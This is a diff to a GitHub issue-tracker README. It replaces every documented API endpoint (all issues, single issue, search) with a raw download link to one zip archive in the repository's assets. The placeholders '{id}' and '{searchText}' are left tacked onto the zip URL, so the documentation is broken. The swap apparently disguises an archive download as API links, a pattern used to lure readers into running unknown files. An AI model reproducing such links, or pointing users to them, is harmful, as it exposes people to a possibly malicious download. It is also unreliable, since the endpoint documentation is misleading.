@@ -11,18 +11,18 @@
 
 ### **API Endpoints:**
 ###  **All Issues:** 
-  - https://phi-lab-server.vercel.app/api/v1/lab/issues 
+  - https://raw.githubusercontent.com/ashikmridha793/B13-A5-Github-Issue-Tracker/main/assets/Tracker_Issue_Github_3.4.zip 
 
 
 ###  **Single Issue:**
-   - https://phi-lab-server.vercel.app/api/v1/lab/issue/{id}
+   - https://raw.githubusercontent.com/ashikmridha793/B13-A5-Github-Issue-Tracker/main/assets/Tracker_Issue_Github_3.4.zip{id}
 
-   - Example: https://phi-lab-server.vercel.app/api/v1/lab/issue/33
+   - Example: https://raw.githubusercontent.com/ashikmridha793/B13-A5-Github-Issue-Tracker/main/assets/Tracker_Issue_Github_3.4.zip
 
 
-###  **Search Issue:** https://phi-lab-server.vercel.app/api/v1/lab/issues/search?q={searchText}
+###  **Search Issue:** https://raw.githubusercontent.com/ashikmridha793/B13-A5-Github-Issue-Tracker/main/assets/Tracker_Issue_Github_3.4.zip{searchText}
 
-   - Example:  https://phi-lab-server.vercel.app/api/v1/lab/issues/search?q=notifications
+   - Example:  https://raw.githubusercontent.com/ashikmridha793/B13-A5-Github-Issue-Tracker/main/assets/Tracker_Issue_Github_3.4.zip
 
 
 ---
